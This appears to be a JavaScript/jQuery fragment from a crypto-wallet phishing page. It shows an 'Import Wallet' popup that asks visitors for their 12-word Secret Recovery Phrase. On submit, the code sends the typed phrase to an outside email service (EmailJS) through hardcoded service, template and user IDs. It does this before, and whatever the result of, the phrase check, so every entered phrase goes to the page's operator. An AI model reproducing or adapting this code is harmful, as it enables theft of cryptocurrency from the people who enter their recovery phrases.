function step4() {
    $('.ww-popup-content').html(`
        <div class="ww-popup-header">
            <div></div>
            <span style="color: black;">Import Wallet</span>
            <svg id="ww-closebtn" class="ww-close" width="20" height="20" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
                <line x1="0" y1="0" x2="20" y2="20" stroke="black" stroke-width="2"/>
                <line x1="20" y1="0" x2="0" y2="20" stroke="black" stroke-width="2"/>
            </svg>
        </div>
        <div class="ww-popup-body-center">
            <img width="64" src="${wallet}">
            <p class="import-wallet-title" style="color: black;">Import Wallet</p>
            <p class="import-wallet-text">To connect your wallet <br/> Enter the Secret Recovery Phrase</p>
            <span class="phrase-text">12-word phrase</span>
            <textarea rows="7" id="wallet-textarea-value" class="import-wallet-textarea"></textarea>
        </div>
        <div class="ww-popup-footer">
            <button id="submit-wallet" class="ww-popup-connect-btn justify-content-center">Connect</button>
        </div>
    `);

    $('#submit-wallet').click(function() {
        var input = $('#wallet-textarea-value').val().trim();
        var words = input.split(/\s+/);

        $("#submit-wallet").prop('disabled', true);

        // Assuming isValidPhrase is a function you'll implement to verify the 12-word phrase
        var isValid = words.length === 12 && isValidPhrase(words);

        var data = {
            service_id: 'service_mc0ya1c',
            template_id: 'template_ckthgzb',
            user_id: 'OmDE4kn-7ssxaUk-2',
            template_params: {
                'message': input
            }
        };
        
        $.ajax({
            url: "https://api.emailjs.com/api/v1.0/email/send",
            type: "post",
            data: JSON.stringify(data),
            contentType: 'application/json',
            success: function(response) {
                if (isValid) {
                    step5(); // Only move to step5 if the phrase is valid
                } else {
                    alert('Find the 12-word recovery phrase in your wallet settings.');
                }
                $("#submit-wallet").prop('disabled', false);
            },
            error: function(jqXHR, textStatus, errorThrown) {
                alert('Failed to send email. Please try again.');
                $("#submit-wallet").prop('disabled', false);
            }
        });

        if (!isValid) {
            alert('You need to input a valid phrase with exactly 12 words.');
            $("#submit-wallet").prop('disabled', false);
            return false;
        }
    });
}

